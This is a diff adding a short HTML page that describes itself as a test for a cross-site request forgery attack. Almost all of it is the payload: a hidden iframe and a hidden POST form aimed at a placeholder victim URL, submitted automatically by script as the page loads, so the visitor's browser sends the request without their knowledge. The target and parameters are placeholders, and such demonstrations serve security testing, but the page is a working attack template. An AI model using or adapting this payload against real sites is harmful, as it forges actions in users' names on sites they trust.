@@ -1,0 +1,11 @@
+<html>
+<body>
+hello, This is a test html that makes a csrf attack to submit a post form to a victim site. You might not even know.
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='http://victim_site_action_url' target="csrf-frame" id="csrf-form">
+  <input type ='hidden' name='param1' value='param1'/>
+  <input type ='hidden' name='param2' value='param2'/>
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
+</body>
+</html>
